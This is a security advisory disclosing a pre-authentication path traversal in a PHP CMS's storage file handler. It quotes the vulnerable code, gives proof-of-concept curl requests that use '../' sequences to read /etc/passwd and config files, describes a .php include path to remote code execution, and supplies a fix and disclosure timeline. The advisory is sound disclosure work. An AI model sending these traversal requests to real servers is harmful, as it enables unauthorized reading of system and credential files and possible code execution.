https://github.com/cockpit-project/cockpit

# Pre-authentication Path Traversal in Space Storage File Serving

**Commit:** 93b7edb  

**File:** `index.php:46-72`  

**CWE:** CWE-22 (Path Traversal)  

**CVSS:** 7.5 (High) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  

*(CVSS applies to setups where the web server does not normalize `..` in URL paths, e.g., PHP built-in server, non-standard Nginx/Apache configs)*

## Summary

The static file serving path for space storage files in `index.php` constructs a filesystem path from `PATH_INFO` (which is set to `REQUEST_URI`) without path containment validation. An unauthenticated attacker can include `..` components in the URL to traverse outside the `.spaces` directory and read arbitrary files from the server filesystem.

---

## Vulnerable Code

**`index.php:46-72`**
```php
// handle static space storage files
if (str_starts_with($_SERVER['PATH_INFO'], '/:') && str_contains($_SERVER['PATH_INFO'], '/storage/')) {

    $spaceFilePath = APP_SPACES_DIR.'/'.trim(substr($_SERVER['PATH_INFO'], 2), '/');
    $path  = pathinfo($spaceFilePath);

    if (is_file($spaceFilePath)) {

        if ($path['extension'] === 'php') {
            include($spaceFilePath);          // ← LFI/RCE via .php files
        } else {
            $mimeType = (new finfo(FILEINFO_MIME_TYPE))->file($spaceFilePath);
            header("Content-Type: {$mimeType}");
            ...
            $fp = fopen($spaceFilePath, 'rb');
            fpassthru($fp);                   // ← arbitrary file read
            fclose($fp);
        }
        exit;
    }
}
```

**`index.php:32`**
```php
$_SERVER['PATH_INFO'] = explode('?', $_SERVER['REQUEST_URI'] ?? '')[0];
```

`PATH_INFO` is set directly from `REQUEST_URI`. `APP_SPACES_DIR` defaults to `__DIR__ . '/.spaces'` (e.g., `/var/www/cockpit/.spaces`).

---

## Root Cause

No path containment check is performed. The code does not compare `realpath($spaceFilePath)` against `realpath(APP_SPACES_DIR)`. `..` components in the URL path allow escaping from the `.spaces` directory.

### Attack Path

For `GET /:x/storage/../../../../../../etc/passwd`:

1. `PATH_INFO = "/:x/storage/../../../../../../etc/passwd"`
2. Conditions: starts with `/:` ✓, contains `/storage/` ✓
3. `substr("/:x/storage/../../../../../../etc/passwd", 2)` = `"x/storage/../../../../../../etc/passwd"`
4. `$spaceFilePath = "/var/www/cockpit/.spaces/x/storage/../../../../../../etc/passwd"`
5. OS resolves to: `/etc/passwd`
6. `is_file("/etc/passwd")` = `true`
7. Extension is `"passwd"` ≠ `"php"` → served directly via `fpassthru`

### .php LFI / RCE

If the traversal points to a `.php` file at a known location (e.g., a PHP session file `/tmp/sess_XXXX` containing PHP code, or a known PHP config file):

```
GET /:x/storage/../../../../var/www/other-app/shell.php
```

If `$path['extension'] === 'php'` → `include($spaceFilePath)` → **remote code execution**.

---

## Exploitation Notes

### Apache (default Docker image: `php:8.3-apache`)

Apache's URL normalization resolves `..` components BEFORE `REQUEST_URI` reaches PHP. Standard production Apache deployments are therefore protected by default. The `.htaccess` also rewrites `/:space/storage/...` patterns via mod_rewrite.

### PHP Built-in Server (development / `php -S`)

The PHP built-in server does NOT normalize `..` in URLs. `REQUEST_URI` contains the raw path, making the traversal fully exploitable:

```bash
# Start Cockpit with built-in PHP server (common dev setup)
php -S localhost:8080 index.php

# Read /etc/passwd
curl "http://localhost:8080/:x/storage/../../../../../../etc/passwd"
```

### Nginx (non-default config)

Standard Nginx configurations normalize `..` in URL paths. However, if `merge_slashes off` is set or the PHP-FPM configuration passes `PATH_INFO` directly from the raw URI, the traversal may be exploitable.

---

## Proof of Concept (PHP Built-in Server)

```bash
# Step 1: Start Cockpit
cd /path/to/cockpit
php -S 0.0.0.0:8080 index.php

# Step 2: Path traversal to read /etc/passwd
curl "http://target:8080/:x/storage/../../../../../../etc/passwd"

# Step 3: Read Cockpit's .env or config
curl "http://target:8080/:x/storage/../../config/config.php"
```

---

## Recommended Fix

Add a path containment check immediately after constructing `$spaceFilePath`:

```php
if (str_starts_with($_SERVER['PATH_INFO'], '/:') && str_contains($_SERVER['PATH_INFO'], '/storage/')) {

    $spaceFilePath = APP_SPACES_DIR.'/'.trim(substr($_SERVER['PATH_INFO'], 2), '/');
    
    // Prevent path traversal
    $realSpacesDir = realpath(APP_SPACES_DIR);
    $realFilePath  = realpath($spaceFilePath);
    if (!$realSpacesDir || !$realFilePath || !str_starts_with($realFilePath, $realSpacesDir . DIRECTORY_SEPARATOR)) {
        // Path is outside .spaces/ — reject silently
        goto framework_bootstrap;
    }
    
    $path = pathinfo($spaceFilePath);
    // ... rest of the handler
}
```

This ensures `$spaceFilePath` always resolves to a canonical path inside `APP_SPACES_DIR`.


## Disclosure Timeline
 - reported on 23 May 2026
 - received thanks and fixed on 25 May 2026
 - requested for CVE on 25 May 2026
 - followed up on request on 17 June 2026
 - multiple releases since the fix; disclosed
   
   <img width="1239" height="517" alt="image" src="https://github.com/user-attachments/assets/d57a2c72-4efc-4472-b7f9-2397708bfb52" />
